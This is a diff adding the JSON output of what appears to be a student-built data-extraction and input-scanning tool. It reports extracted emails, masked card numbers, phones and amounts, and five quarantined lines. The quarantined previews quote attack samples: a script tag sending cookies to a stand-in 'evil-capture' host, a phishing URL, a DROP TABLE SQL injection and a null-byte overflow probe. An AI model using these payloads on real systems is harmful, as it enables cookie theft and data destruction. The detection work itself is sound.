@@ -1,0 +1,134 @@
+{
+  "security_summary": {
+    "total_lines_scanned": 58,
+    "lines_quarantined": 5,
+    "quarantined_lines": [
+      {
+        "line_number": 22,
+        "preview": "From: \"admin\"<script>document.location='http://evil-capture.example/steal?c='+do...",
+        "reasons": [
+          "embedded <script> tag (possible XSS)"
+        ]
+      },
+      {
+        "line_number": 24,
+        "preview": "Body: Click here to verify: http://192.168.1.1@secure-login-alueducation.com.ver...",
+        "reasons": [
+          "javascript: pseudo-protocol",
+          "credential-stuffed / phishing-style URL (user@host trick)"
+        ]
+      },
+      {
+        "line_number": 25,
+        "preview": "Also try hxxp://bit.ly/3xKp9z or www.totally-legit-bank.com/login.html?user=admi...",
+        "reasons": [
+          "SQL comment injection pattern ('--)"
+        ]
+      },
+      {
+        "line_number": 47,
+        "preview": "From: ; DROP TABLE tickets;-- @nowhere",
+        "reasons": [
+          "SQL-injection-style keyword"
+        ]
+      },
+      {
+        "line_number": 49,
+        "preview": "Body: %00%00 buffer_overflow_test AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...",
+        "reasons": [
+          "null-byte injection attempt",
+          "abnormally long repeated-character run (possible buffer overflow probe)"
+        ]
+      }
+    ]
+  },
+  "extracted_data": {
+    "emails": {
+      "general": [
+        "s.mutoni92@gmail.com",
+        "t.nshimiye+jobs@gmail.com"
+      ],
+      "alu_official": [
+        "emmanuel.hakizimana@alueducation.com",
+        "sarah.mutoni@alueducation.com"
+      ],
+      "alu_alumni": [
+        "k.uwase@alumni.alueducation.com",
+        "t.nshimiye@alumni.alueducation.com"
+      ],
+      "alu_si": [
+        "grace.iradukunda@si.alueducation.com",
+        "j.karenzi@si.alueducation.com"
+      ]
+    },
+    "credit_cards": [
+      {
+        "masked": "**** **** **** 6467",
+        "network_length": 16,
+        "valid_luhn": true
+      },
+      {
+        "masked": "**** **** **** 0004",
+        "network_length": 16,
+        "valid_luhn": true
+      },
+      {
+        "masked": "**** **** **** 9424",
+        "network_length": 16,
+        "valid_luhn": true
+      }
+    ],
+    "urls": [
+      "http://maps.example.com/alu-kigali-campus?zoom=15#pin=22",
+      "https://billing.alueducation.com/invoices/2026/09?id=88213&ref=abc-def_123",
+      "https://portal.alueducation.com/payments"
+    ],
+    "phone_numbers": [
+      "(250) 788-999-111",
+      "+250 788 123 456",
+      "+250-722-000-111",
+      "000-000-0000",
+      "078-222-3344"
+    ],
+    "times": {
+      "12_hour": [
+        "03:15 PM",
+        "09:30 AM",
+        "2:00 PM",
+        "5:00 PM",
+        "5:30pm",
+        "8:00 AM",
+        "9:00 AM",
+        "9:30am"
+      ],
+      "24_hour": [
+        "07:45",
+        "14:00",
+        "15:15"
+      ]
+    },
+    "hashtags": [
+      "#ALUAlumni",
+      "#ALUKigali",
+      "#Billing",
+      "#CareerFair2026",
+      "#Invoice2026",
+      "#StillWaiting",
+      "#TuitionPaid"
+    ],
+    "currency_amounts": [
+      "$149.99",
+      "$2,399.00",
+      "$60",
+      "KES 15,000",
+      "\u00a345.50",
+      "\u20ac1,250.00"
+    ],
+    "html_tags_found_and_ignored": [
+      "</b>",
+      "</div>",
+      "<b>",
+      "<div class=\"chat-widget\" data-user=\"10237\">"
+    ]
+  }
+}
